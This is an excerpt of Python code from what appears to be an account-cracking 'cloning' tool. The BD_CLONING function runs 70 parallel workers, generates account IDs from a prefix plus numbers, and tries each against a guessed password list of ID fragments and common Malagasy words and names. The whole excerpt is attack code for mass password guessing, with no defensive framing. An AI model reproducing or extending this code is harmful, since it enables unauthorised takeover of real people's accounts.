...
def BD_CLONING():
    ...
    with tred(max_workers=70) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],'fitiavana','mihary','vadiko','hasina','anjara','felana','mamiko','mahery','safidy','santatra','tolotra','finoana','sitraka','tantely','faneva','nantenaina','fanantenana','mahefa','mamako','namako','fitiavako','nirina','fifalina','nomena','solofo','fandresena','malala','amboara','lahatra','lafatra','saholy','papako','fitiavana','seheno','fahendrena','tolotra','valisoa','dadako','koloina','fitiavako','randria','nekena','namako','nilaina','fifalina','miangaly','fandresena','faniry','harena','finaritra','mandresy','fiderana','mendrika','tokiniaina','andria','rakoto','tahiry','rojotiana','diamondra','tsilavina','maminirina','fahendrena','fiderana','jesosy','milely','narovana','narindra','sarobidy','sarindra','malagasy','rakotomalala']
